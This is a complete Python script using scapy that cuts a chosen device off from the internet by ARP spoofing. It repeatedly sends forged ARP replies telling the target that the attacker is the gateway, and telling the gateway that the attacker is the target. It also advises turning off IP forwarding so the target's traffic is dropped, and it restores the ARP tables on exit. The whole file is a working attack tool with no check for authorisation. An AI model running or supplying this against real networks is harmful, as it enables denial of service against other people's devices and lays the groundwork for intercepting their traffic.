import time
import sys
import argparse
import os
from scapy.all import ARP, Ether, srp, send, sendp

def get_mac(ip):
    print(f"[*] Resolving MAC for {ip}...")
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
    if ans:
        mac = ans[0][1].hwsrc
        print(f"    Found: {mac}")
        return mac
    print(f"[-] Could not resolve MAC address for {ip}. Is it reachable?")
    return None

def spoof(target_ip, target_mac, host_ip):
    # Op=2 (is-at/reply)
    # Tell target_ip that host_ip is AT (my mac, auto-filled by scapy)
    # Use Ether layer to avoid warnings and ensure L2 delivery
    packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
    sendp(packet, verbose=False)

def restore(target_ip, host_ip):
    target_mac = get_mac(target_ip)
    host_mac = get_mac(host_ip)
    if target_mac and host_mac:
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
        sendp(packet, count=4, verbose=False)

def check_ip_forwarding():
    # Check if IP forwarding is enabled
    if os.path.exists("/proc/sys/net/ipv4/ip_forward"):
        with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
            if f.read().strip() == "1":
                print("\n[!] WARNING: IP Forwarding is ENABLED on this machine!")
                print("    The target might still have internet access through you.")
                print("    To effectively block internet, disable forwarding:")
                print("    sudo sysctl -w net.ipv4.ip_forward=0\n")
                return True
    return False

def main():
    parser = argparse.ArgumentParser(description="ARP Isolation Tool (Block Internet Access)")
    parser.add_argument("-t", "--target", required=True, help="IP address of the target device")
    parser.add_argument("-g", "--gateway", required=True, help="IP address of the gateway/router")
    args = parser.parse_args()

    # Pre-flight checks
    if os.geteuid() != 0:
        print("[-] This script requires root privileges. Please run with sudo.")
        sys.exit(1)

    check_ip_forwarding()

    target_mac = get_mac(args.target)
    if not target_mac:
        sys.exit(1)
        
    gateway_mac = get_mac(args.gateway)
    if not gateway_mac:
        print("[-] Could not find Gateway MAC. Continuing anyway...")

    print(f"[*] Blocking internet for {args.target} by spoofing Gateway {args.gateway}")
    print("[*] Press Ctrl+C to stop and restore network.")

    try:
        while True:
            # Tell Target that We are the Gateway
            # Target sends traffic to us -> We drop it (if forwarding is off) -> Connection Fails
            spoof(args.target, target_mac, args.gateway)
            
            # Optionally tell Gateway we are the Target (prevents return traffic too)
            if gateway_mac:
                spoof(args.gateway, gateway_mac, args.target)
            
            time.sleep(2)
            sys.stdout.write(".")
            sys.stdout.flush()
            
    except KeyboardInterrupt:
        print("\n[*] Stopping...")
        print("[*] Restoring ARP tables (this may take a few seconds)...")
        restore(args.target, args.gateway)
        if gateway_mac:
            restore(args.gateway, args.target)
        print("[*] Done.")

if __name__ == "__main__":
    main()
